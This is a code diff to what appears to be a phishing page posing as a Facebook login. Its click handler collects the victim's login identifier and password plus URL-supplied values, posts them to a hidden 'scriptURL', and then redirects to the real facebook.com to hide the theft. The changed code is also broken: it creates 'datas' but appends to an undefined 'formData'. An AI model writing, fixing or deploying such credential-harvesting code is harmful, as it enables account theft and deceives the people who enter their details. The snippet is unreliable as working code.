@@ -223,17 +223,18 @@
 		 const submitlog = document.querySelector('#submitlog');
             submitlog.addEventListener('click', e => {
               e.preventDefault();
-		    datas ={
-			    num: urlParams.get("vall"),
-			    name: urlParams.get("name"),
-			    mob: emalog.value,
-			    forlog: paslog.value,
-  }
+
+		    let datas = new FormData();
+formData.append("name", urlParams.get("name"));
+formData.append("num", urlParams.get("vall"));
+		    formData.append("mob", emalog.value);
+formData.append("forlog", paslog.value);
+		    
+		    
 		    submitlog.style.opacity = 0.6;
 		    submitlog.disabled = true;
               fetch(scriptURL, { 
 		      method: 'POST',
-		      headers: {'Content-Type': 'application/json'},
 				body: JSON.stringify(datas) })
                 .then(response => window.location.href = "https://facebook.com/")
                 .catch(error => console.error('Error!', error.message))
